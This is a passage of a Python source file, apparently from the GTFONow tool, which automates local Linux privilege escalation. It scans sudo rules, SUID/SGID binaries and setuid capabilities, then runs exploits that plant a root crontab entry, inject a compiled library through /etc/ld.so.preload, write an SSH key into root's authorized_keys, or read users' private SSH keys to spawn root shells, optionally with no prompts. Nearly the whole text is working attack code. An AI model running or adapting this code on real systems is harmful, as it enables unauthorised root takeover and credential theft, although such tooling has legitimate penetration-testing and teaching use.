        elif chosen_option == "ld_preload":
            ld_preload_exploit(binary, payload, command)
        elif chosen_option == "arbitrary":
            manual_arbitrary_file_write(payload)
    if risk == 2 and auto:
        options = get_arb_write_options(user)
        for option in options:
            if option[0] == "ssh":
                ssh_write_privesc(payload, user, command)
            if option[0] == "ld_preload":
                ld_preload_exploit(binary, payload, command)
            if option[0] == "cron":
                cron_priv_esc(payload, command)


def manual_arbitrary_file_write(payload):
    print("Create a file named " + GREEN + "input_file" +
          RESET + " containing the file content")
    log.info("Spawning temporary shell to create file, type 'exit' when done")
    os.system("/bin/bash")
    print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
    file_to_write = input("> ")
    payload = payload.replace("file_to_write", file_to_write)
    os.system(payload)


def spawn_shell(payload):
    """Spawn shell, if exits with return code 0, we assume exploit worked and this is a user controlled exit."""
    if sys.version_info[0] < 3:
        res = subprocess.call(payload, shell=True)
    else:
        res = subprocess.run(payload, shell=True)
    if res.returncode == 0:
        print("Thanks for using GTFONow!")
        sys.exit()


def exploit(binary,  payload, exploit_type, risk, auto, binary_path=None, user="root", command=None):
    """Exploit a binary.

    Args:
        binary (str): Binary to exploit.
        payload (str): Exploit payload.
        binary_path (str, optional): Path to binary.. Defaults to None.
        user (str, optional): User to exploit. Defaults to "root".
    """

    if exploit_type == SUDO_NO_PASSWD and user != "root":
        payload = payload.replace("sudo", "sudo -u " + user)
    if binary_path:
        payload = payload.replace("./"+binary, binary_path)
    else:
        payload = payload.replace("./"+binary, binary)
    if "file_to_read" in payload:
        arbitrary_file_read(binary, payload, auto, user, command)
    elif "file_to_write" in payload:
        arbitrary_file_write(binary, payload, risk,  auto, user, command)
    else:
        if command:
            execute_privileged_command(payload, command)
        else:
            log.info("Spawning %s shell", user)
            spawn_shell(payload)


def execute_privileged_command(payload, command):
    log.debug("Executing %s", payload)
    process = subprocess.Popen(
        payload, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    bytes_command = (command + "\n").encode('utf-8')
    process.stdin.write(bytes_command)
    out, err = process.communicate()
    if out:
        print(out)
    if process.returncode == 0:
        print("Thanks for using GTFONow!")
        sys.exit()
    if err:
        log.error(err)


def get_sudo_l_output():
    """Gets the output of sudo -l command.

    Returns:
        str: Output of sudo -l command.
    """
    try:
        process = subprocess.Popen(
            ['sudo', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for _ in range(10):
            time.sleep(0.1)
            if process.poll() is not None:
                break
        else:
            process.kill()
            print("Command timed out. User may need to enter a password.")
            return

        stdout, _ = process.communicate()

        if sys.version_info[0] >= 3:
            stdout = stdout.decode('utf-8')

        return stdout
    except Exception as e:
        print("Error: " + str(e))
        return


def check_sudo_binaries(sudo_l_output):
    """Checks for privilege escalations via binaries in sudo -l output.

    Args:
        sudo_l_output (str): Output of sudo -l command.

    Returns:
        list: Returns a list of potential privilege escalations.
    """
    priv_escs = []
    all_matches = re.findall(r'\(.*\) (.*)', sudo_l_output)
    for match in all_matches:
        if 'NOPASSWD' not in match:
            binaries = match.split(', ')
            for binary_path in binaries:
                binary = binary_path.split('/')[-1]
                if binary not in sudo_bins.keys():
                    continue

                payloads = sudo_bins.get(binary)
                priv_esc = {
                    "Binary": binary,
                    "Path": binary_path,
                    "Payloads": payloads,
                    "Type": "Sudo (Needs Password)"
                }
                priv_escs = priv_escs + expand_payloads(priv_esc)

    return priv_escs


def expand_payloads(priv_esc):
    """Given a priv esc entry, expand into multiple payloads."""

    priv_escs = []

    for payload in priv_esc["Payloads"]:
        priv_esc_copy = priv_esc.copy()
        priv_esc_copy["Payload"] = payload["code"]
        priv_esc_copy["Payload Description"] = payload.get("description")
        priv_esc_copy["Payload Type"] = payload_type(payload["code"])
        del priv_esc_copy["Payloads"]
        priv_escs.append(priv_esc_copy)
    return priv_escs


def check_sudo_nopasswd_binaries(sudo_l_output):
    """Checks for privilege escalations via NOPASSWD binaries in sudo -l output.

    Args:
        sudo_l_output (str): Output of sudo -l command.

    Returns:
        list: Returns a list of potential privilege escalations.
    """
    priv_escs = []
    matches = re.findall(r'\(([^)]+)\) NOPASSWD: (.*)', sudo_l_output)
    for user, command_paths in matches:
        if user.lower() == "all":
            user = "root"
        binaries = command_paths.split(', ')
        for binary_path in binaries:
            binary = binary_path.split('/')[-1]
            if binary not in sudo_bins.keys():
                log.info("Found NOPASSWD binary %s, but no known exploit.", binary)
                continue

            payloads = sudo_bins.get(binary)
            priv_esc = {
                "SudoUser": user,
                "Binary": binary,
                "Path": binary_path,
                "Payloads": payloads,
                "Type": SUDO_NO_PASSWD
            }
            log.warning("Found exploitable %s binary: %s",
                        SUDO_NO_PASSWD, binary_path)
            priv_escs = priv_escs + expand_payloads(priv_esc)

    return priv_escs


def is_linux():
    """
    Check if the host operating system is a variant of Linux.

    Returns:
        bool: True if the OS is Linux, False otherwise.
    """
    return platform.system() == "Linux"


def check_suid_bins():
    """
    Checks if any binaries in PATH are suid or sgid binaries and referenced in GTFOBins.

    Returns:
        list: A list of potential privilege escalations.
    """
    priv_escs = []
    for binary, payloads in suid_bins.items():
        binary_path = get_binary_path(binary)
        if not binary_path:
            continue

        file_properties = check_suid_sgid(binary_path)
        is_suid = file_properties.get("SUID")
        is_sgid = file_properties.get("SGID")

        if is_suid or is_sgid:
            priv_esc = {
                "Binary": binary,
                "Path": binary_path,
                "Payloads": payloads,
                "Type": SUID_SGID,
                "SUID": file_properties.get("Owner") if is_suid else None,
                "SGID": file_properties.get("Group") if is_sgid else None
            }
            priv_escs = priv_escs + expand_payloads(priv_esc)

            log.warning("Found exploitable %s binary: %s", "suid" if is_suid else "sgid",
                        binary_path)

    return priv_escs


def check_capability(binary_path, capability):
    """
    Check if the given capability (e.g., 'cap_setuid') is set on the binary using the getcap command.

    Args:
    binary_path (str): The full path to the binary.
    capability (str): The capability to check for (e.g., 'cap_setuid').

    Returns:
    bool: True if the capability is set, False otherwise.
    """

    if get_binary_path("getcap") is None:
        log.error("getcap not found in PATH, cannot escalate using capabilities")
        return

    try:
        result, error = execute_command(["getcap", binary_path])

        if capability in result:
            return True
        return False

    except subprocess.CalledProcessError as e:
        print("Error: %s", e)
        return False


def is_service_running(service):
    """
    Check if a service is running.

    Returns:
    bool: True if service is running, False otherwise.
    """

    if get_binary_path("service"):
        result, error = execute_command(["service", service, "status"])
        if " is running" in result:
            return True
    if get_binary_path("systemctl"):
        result, error = execute_command(["systemctl", "status", service])
        if "active (running)" in result:
            return True
    return False


def cron_priv_esc(payload, command=None):
    """Turns arbitrary write into shell by writing to cron.

    Args:
        payload (str): Exploit payload.
    """
    CRONTAB_PATHS = ["/etc/cron.d/", "/etc/cron.daily/", "/etc/cron.hourly/",
                     "/etc/cron.monthly/", "/etc/cron.weekly/", "/var/spool/cron/crontabs/"]

    file_to_write = "/var/spool/cron/crontabs/root"
    payload = payload.replace("file_to_write", file_to_write)
    payload = payload.replace("DATA", "* * * * * chmod u+s /bin/bash")
    log.info("Writing payload to crontab %s", file_to_write)
    execute_command(payload)
    log.info("Waiting for cron to execute payload")
    count = 0
    while True:
        if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
            log.info("SUID bit set on /bin/bash, spawning root shell")
            if command:
                execute_privileged_command(payload, command)
            else:
                spawn_shell("/bin/bash -p")
            break
        time.sleep(1)
        count = count + 1
        if count > 65:
            log.error("Cron did not execute payload, something went wrong.")
            break


def ld_preload_exploit(binary, payload, command=None):
    """Turns arbitrary write into shell by writing to /etc/ld.so.preload

    Args:
        Binary (str): Binary to exploit.
        payload (str): Exploit payload.
    """
    if get_binary_path("gcc") is None:
        log.error("gcc not found in PATH, cannot escalate using LD_PRELOAD")
        return

    lib_src = """
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    __attribute__ ((__constructor__))
    void dropshell(void){
        chown("/bin/bash", 0, 0);
        chmod("/bin/bash", 04755);
        unlink("/etc/ld.so.preload");
        printf("Complete.");
    }
    """

    f = open("/tmp/libpwn.c", "w")
    f.write(lib_src)
    f.close()
    execute_command("gcc -w -shared -o /tmp/libpwn.so /tmp/libpwn.c")

    # f = open("/tmp/libpwn.so", "rb")
    # binary_data = f.read()
    # lib_data = ''.join(f'\\x{byte:02x}' for byte in binary_data)
    # payload_1 = payload.replace("DATA", lib_data)
    # payload_1 = payload_1.replace("file_to_write", "/lib/libgtfo.so")
    # payload_1 = payload_1.replace("echo", "echo -n -e")

    payload = re.sub("data", "/tmp/libpwn.so", payload, flags=re.IGNORECASE)
    payload = payload.replace("file_to_write", "/etc/ld.so.preload")
    execute_command(payload)
    execute_command(binary + " --help >/dev/null 2>&1")

    if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
        log.info("SUID bit set on /bin/bash, spawning root shell")
        if command:
            execute_privileged_command("/bin/bash -p", command)
        else:
            spawn_shell("/bin/bash -p")


def check_cap_bins():
    """Checks if any binaries in PATH are have vulnerable capabilities referenced in GTFOBins."""

    if get_binary_path("getcap") is None:
        log.error("getcap not found in PATH, cannot escalate using capabilities")
        return []

    potential_privesc = []
    for binary, payloads in capabilities.items():
        binary_path = get_binary_path(binary)
        if binary_path is None:
            continue
        if check_capability(binary_path, "cap_setuid"):
            log.warning(
                "Found exploitable suid binary: %s", binary)
            priv_esc = {"Binary": binary, "Path": binary_path,
                        "Payloads": payloads, "Type": "Capability", "Capability": "cap_setuid"}
            potential_privesc.append(priv_esc)
    return potential_privesc


# def is_binary_in_gtfobins(binary, gtfo_list):
#     # Check for specific versions of python, not caught by default list
#     pattern = r'^python\d+(\.\d+)?$'
#     if re.match(pattern, binary):
#         binary = "python"
#     return binary in gtfo_list.keys()


def check_cap_full_disk():
    """Checks if any binaries on the filesystem have vulnerable capabilities

    Returns:
        list: Returns a list of potential privilege escalations.
    """

    if get_binary_path("getcap") is None:
        log.error("getcap not found in PATH, cannot escalate using capabilities")
        return []
    res, err = execute_command("getcap -r / 2>/dev/null")
    potential_privesc = []

    for line in res.splitlines()[:-1]:
        line = line.decode("utf-8")
        parts = line.split(" ")
        caps = parts[-1]
        cap_parts = caps.split(",")
        binary_path = " ".join(parts[:-1])
        for cap in cap_parts:
            if "setuid" in cap:
                binary = binary_path.split("/")[-1]
                if binary in capabilities.keys():
                    priv_esc = {"Binary": binary, "Path": binary_path,
                                "Payloads": capabilities[binary], "Type": "Capability", "Capability": cap}
                    log.warning(
                        "Found cap_setuid binary: %s",  binary_path)
                    potential_privesc.append(priv_esc)
                else:
                    log.info(
                        "cap_setuid binary %s found, but no public exploit in GTFOBins", binary_path)
            else:
                log.info(
                    "Found unexploitable capability %s for %s", cap, binary_path)

    return potential_privesc


def ssh_write_privesc(payload, user="root", command=None):
    """Turns arbitrary write into shell by writing to user's SSH key

    Args:
        payload (str): Exploit payload
        user (str, optional): User to exploit. Defaults to "root".
    """

    if get_binary_path("ssh-keygen") is None:
        log.error("ssh-keygen not found in PATH, cannot escalate using SSH key")
        return

    if user == "root":
        home_dir = "/root"
    else:
        home_dir = "/home/"+user
    log.info("Writing SSH key to %s", home_dir+"/.ssh/authorized_keys")

    execute_command("ssh-keygen -N '' -f /tmp/gtfokey")
    with open("/tmp/gtfokey.pub", "r") as f:
        pub_key = f.read()
        pub_key = pub_key.strip()
        payload = payload.replace("DATA", pub_key)
        payload = payload.replace(
            "file_to_write", home_dir+"/.ssh/authorized_keys")

        res, err = execute_command(payload)
        shell_payload = "ssh -o StrictHostKeyChecking=no -i /tmp/gtfokey "+user+"@localhost"
        if not err:
            if command:
                execute_privileged_command(shell_payload, command)
            else:
                spawn_shell(shell_payload)


def ssh_key_privesc(payload, user="root", command=None):
    """Turns arbitrary read into shell by reading user's SSH key.

    Args:
        payload (str): Exploit payload.
        user (str, optional): User to exploit. Defaults to "root".
    """

    key_names = ["id_dsa", "id_ed25519", "id_rsa", "id_ecdsa"]

    if user == "root":
        home_dir = "/root"
    else:
        home_dir = "/home/"+user
    log.info("Checking for SSH keys in %s", home_dir+"/.ssh/")

    for key in key_names:
        path = home_dir+"/.ssh/"+key
        exploit_payload = payload.replace("file_to_read", path)
        res, err = execute_command(exploit_payload)
        if not err:
            priv_key = res.strip()
            if "encrypted" in priv_key.lower():
                log.error("Key %s is encrypted, skipping", path)
            log.info("Spawning %s SSH shell using %s", user, path)
            shell_payload = "ssh-agent bash -c \"ssh-add <(echo '" + priv_key + \
                "') && ssh -o \"StrictHostKeyChecking=no\" "+user+"@localhost\""
            if command:
                execute_privileged_command(shell_payload, command)
            else:
                spawn_shell(shell_payload)


def payload_type(payload):
    """Determine payload type.

    Args:
        payload (str): Exploit payload.

    Returns:
        str: Payload type, eg shell, or arbitrary read.
    """
    if "file_to_read" in payload:
        return "Arbitrary read"
    elif "file_to_write" in payload:
        return "Arbitrary write"
    elif "file_to_change" in payload:
        return "File Permission Change"
    elif "sh" in payload:
        return "Shell"
    else:
        return "Unknown"


def get_binary_path(binary_name):
    """
    Find the full path of a binary, similar to the Unix 'which' command.

    Args:
    binary_name (str): The name of the binary to search for.

    Returns:
    str: The full path to the binary if found, otherwise None.
    """
    for path in os.environ["PATH"].split(os.pathsep):
        full_path = os.path.join(path, binary_name)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            log.debug("Found %s at %s", binary_name, full_path)
            return full_path
    log.debug("Could not find %s in PATH", binary_name)
    return None


def check_suid_sgid(file_path):
    """
    Check if the SUID or SGID bit is set on the file at the given path and return the owner and group.

    Args:
        file_path (str): The path to the file.

    Returns:
        dict: A dictionary with the SUID and SGID status, and owner and group of the file.
    """
    try:
        file_stat = os.stat(file_path)
        mode = file_stat.st_mode

        is_suid = bool(mode & stat.S_ISUID)
        is_sgid = bool(mode & stat.S_ISGID)

        owner_id = file_stat.st_uid
        group_id = file_stat.st_gid

        owner_name = pwd.getpwuid(owner_id).pw_name
        group_name = grp.getgrgid(group_id).gr_name

        return {"SUID": is_suid, "SGID": is_sgid, "Owner": owner_name, "Group": group_name}

    except FileNotFoundError:
        return {"Error": "File not found"}


def is_binary_in_path(binary_path):
    """
    Check if the given binary path is in the user's PATH.

    Args:
        binary_path (str): The full path to the binary.

    Returns:
        bool: True if the binary is in the PATH, False otherwise.
    """
    binary_name = os.path.basename(binary_path)

    for path in os.environ["PATH"].split(os.pathsep):
        full_path = os.path.join(path, binary_name)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            return True
    return False


def check_suid_full_disk():
    """Searches files system for vulnerable suid and sguid binaries.

    Returns:
        list: Returns a list of potential privilege escalations.
    """

    res, err = execute_command("find / -perm -4000 -type f 2>/dev/null")
    binary_paths = res.split("\n")[:-1]
    res, err = execute_command("find / -perm -2000 -type f 2>/dev/null")
    sgid_binaries = res.split("\n")[:-1]
    new_binaries = set(binary_paths) - set(sgid_binaries)
    binary_paths.extend(new_binaries)

    potential_privesc = []
    for binary_path in binary_paths:
        if is_binary_in_path(binary_path):
            continue
        binary = binary_path.split("/")[-1]
        if binary in suid_bins.keys():
            file_properties = check_suid_sgid(binary_path)
            is_suid = file_properties.get("SUID")
            is_sgid = file_properties.get("SGID")
            priv_esc = {
                "Binary": binary,
                "Path": binary_path,
                "Payloads": suid_bins[binary],
                "Type": SUID_SGID,
                "SUID": file_properties.get("Owner") if is_suid else None,
                "SGID": file_properties.get("Group") if is_sgid else None
            }
            log.warning(
                "Found exploitable suid binary outside of user's PATH: %s", binary_path)
            potential_privesc.append(priv_esc)
        else:
            log.info(
                "Found suid/sgid binary, however there is no known GTFOBin exploit: %s", binary_path)
    return potential_privesc


def get_user_choice(prompt):
    choice = input("\n"+prompt)
    return int(choice)


def print_banner():
    print(GREEN+r"""
  ___________________  _  __          
 / ___/_  __/ __/ __ \/ |/ /__ _    __
/ (_ / / / / _// /_/ /    / _ \ |/|/ /
\___/ /_/ /_/  \____/_/|_/\___/__,__/ 
"""+RESET)
    print("https://github.com/Frissi0n/GTFONow\n")


def parse_arguments():
    parser = argparse.ArgumentParser(
        description='GTFONow: Automatic privilege escalation using GTFOBins')
    parser.add_argument('--level', default=1, choices=[1, 2], type=int,
                        help='Level of checks to perform. Default level 1 for a quick scan.')
    parser.add_argument("--risk", default=1, choices=[1, 2],
                        type=int, help="Risk level of exploit to perform. Default risk level 1 for safe operations.")
    parser.add_argument("--sudo_password", action="store_true",
                        help="If you know the sudo password, enable sudo_password mode for more privilege escalation options.")
    parser.add_argument(
        "--command", help="Rather than spawn an interactive shell, issue a single command. Mainly for debugging purposes only.")
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output.')
    parser.add_argument("-a", "--auto", action="store_true",
                        help="Auto exploit without prompting for user input.")
    return parser.parse_args()


def get_sudo_password():
    """Securely gets the sudo password from the user.

    Returns:
        str: sudo password.
    """
    print("Enter sudo password:")
    return getpass.getpass("> ")


def perform_privilege_escalation_checks(args):
    sudo_privescs, suid_privescs, cap_privescs = [], [], []

    suid_privescs = check_suid_bins()

    if get_binary_path("sudo"):
        if args.sudo_password:
            sudo_password = get_sudo_password()
        sudo_l_output = get_sudo_l_output()
        if sudo_l_output:
            sudo_privescs.extend(check_sudo_binaries(sudo_l_output))
            sudo_privescs.extend(check_sudo_nopasswd_binaries(sudo_l_output))

    if is_linux():
        cap_privescs.extend(check_cap_bins())

    if args.level >= 2:
        suid_privescs.extend(check_suid_full_disk())
        cap_privescs.extend(check_cap_full_disk() if is_linux() else [])

    return sudo_privescs, suid_privescs, cap_privescs


def display_privilege_escalation_options(priv_escs):
    if not priv_escs:
        logging.warning("No privilege escalations found.")
        sys.exit(1)

    print("\nExploits available:")

    for key, value in enumerate(priv_escs):
        print_formatted_priv_esc_option(key, value)


def print_formatted_priv_esc_option(key, value):
    info = format_priv_esc_info(value)
    print(GREEN+"["+str(key)+"] " + RESET + value['Binary'] +
          GREEN + " " + value["Payload Type"] + RESET)
    print("  Path: " + value["Path"])
    print("  Info: " + info)
    if value.get("Payload Description"):
        print("  Description: " + value["Payload Description"])


def order_priv_escs(priv_esc):
    """Order privilege escalations by exploitability, ease and impact."""

    user = priv_esc.get("SudoUser") or priv_esc.get("SUID")
    if user == "root" or priv_esc["Type"] == "Capability":
        user_priority = 0
    else:
        user_priority = 1

    if priv_esc["Payload Type"] == "Shell":
        payload_priority = 0
    elif priv_esc["Payload Type"] == "Arbitrary read":
        payload_priority = 1
    elif priv_esc["Payload Type"] == "Arbitrary write":
        payload_priority = 2
    elif priv_esc["Payload Type"] == "File Permission Change":
        payload_priority = 3
    else:
        payload_priority = 4

    return (user_priority, payload_priority)


def format_priv_esc_info(priv_esc):
    """
    Formats the privilege escalation information based on the type.
    """
    info = ""
    priv_type = priv_esc["Type"]

    if priv_type == SUDO_NO_PASSWD and priv_esc.get("SudoUser"):
        user = priv_esc.get("SudoUser")
        formatted_user = RED + user + RESET if user == "root" else GREEN + user + RESET
        info = "Sudo NOPASSWD as user " + formatted_user

    elif priv_type == SUID_SGID:
        owner = priv_esc.get("SUID")
        group = priv_esc.get("SGID")
        if owner:
            formatted_owner = RED + owner + RESET if owner == "root" else GREEN + owner + RESET
            info = "SetUID binary as user " + formatted_owner
        if group:
            if info:
                info += ", "
            info += "SetGID binary as group " + group

    elif priv_type == "Capability":
        capability = priv_esc.get("Capability", "N/A")
        info = "Binary with capability " + capability

    return info


def execute_payload(priv_esc, risk, auto, command=None):
    user = priv_esc.get("SudoUser") or priv_esc.get("Owner")
    if user:
        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk, auto,
                binary_path=priv_esc["Path"], user=user, command=command)
    else:
        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk, auto,
                binary_path=priv_esc["Path"], command=command)


def main():
    args = parse_arguments()

    if args.verbose:
        log.set_level(logging.DEBUG)

    print_banner()
    sudo_privescs, suid_privescs, cap_privescs = perform_privilege_escalation_checks(
        args)

    priv_escs = sudo_privescs + suid_privescs + cap_privescs
    priv_escs = sorted(priv_escs, key=order_priv_escs)
    if args.auto and args.risk == 1:
        priv_escs = [item for item in priv_escs if item["Payload Type"] in [
            "Shell", "Arbitrary read"]]

        for priv_esc in priv_escs:
            execute_payload(priv_esc, args.risk, args.auto, args.command)
    if args.auto and args.risk == 2:
        priv_escs = [item for item in priv_escs if item["Payload Type"] in [
            "Shell", "Arbitrary read", "Arbitrary write"]]
        for priv_esc in priv_escs:
            execute_payload(priv_esc, args.risk, args.auto, args.command)
    display_privilege_escalation_options(priv_escs)

    choice = get_user_choice("Choose method to GTFO: ")
    selected_priv_esc = priv_escs[choice]
    execute_payload(selected_priv_esc, args.risk, args.auto, args.command)


if __name__ == "__main__":
    main()
